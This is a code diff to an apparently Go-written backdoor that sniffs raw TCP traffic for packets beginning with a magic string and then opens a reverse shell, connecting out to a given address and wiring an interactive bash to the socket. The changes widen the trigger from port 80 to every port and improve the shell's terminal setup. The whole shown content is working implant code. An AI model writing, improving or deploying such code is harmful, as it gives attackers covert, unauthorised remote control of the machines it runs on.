@@ -22,14 +22,14 @@ func main() {
 	var wg sync.WaitGroup
 
 	wg.Add(1)
-	go listen(80, &wg)
+	go listen(&wg)
 	wg.Wait()
 }
 
-func listen(port layers.TCPPort, wg *sync.WaitGroup) {
+func listen(wg *sync.WaitGroup) {
 	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
 	if err != nil {
-		log.Fatalf("Faild to open raw socket: %s", err)
+		log.Fatalf("Failed to open raw socket: %s", err)
 	}
 	f := os.NewFile(uintptr(fd), fmt.Sprintf("fd %d", fd))
 	defer f.Close()
@@ -45,11 +45,9 @@ func listen(port layers.TCPPort, wg *sync.WaitGroup) {
 
 		if tcpLayer := packet.Layer(layers.LayerTypeTCP); tcpLayer != nil {
 			tcp, _ := tcpLayer.(*layers.TCP)
-			if tcp.DstPort == port {
-				payload := string(tcp.Payload)
-				if strings.HasPrefix(payload, MagicNumber) {
-					go handlePacket(packet)
-				}
+			payload := string(tcp.Payload)
+			if strings.HasPrefix(payload, MagicNumber) {
+				go handlePacket(packet)
 			}
 		}
 	}
@@ -77,14 +75,14 @@ func handlePacket(packet gopacket.Packet) {
 }
 
 func runReverseShell(addr string) {
-	log.Printf("Connection to %s...", addr)
+	log.Printf("Connecting to %s...", addr)
 	conn, err := net.Dial("tcp", addr)
 	if err != nil {
 		log.Printf("Failed to open connection: %s", err)
 	}
 	defer conn.Close()
 	if conn != nil {
-		shellCmd := exec.Command("/bin/bash", "-i", "-c", "script /dev/null")
+		shellCmd := exec.Command("/bin/bash", "-c", "TERM=xterm SHELL=/bin/bash script --quiet /dev/null")
 		shellCmd.Stdin = conn
 		shellCmd.Stdout = conn
 		shellCmd.Stderr = conn
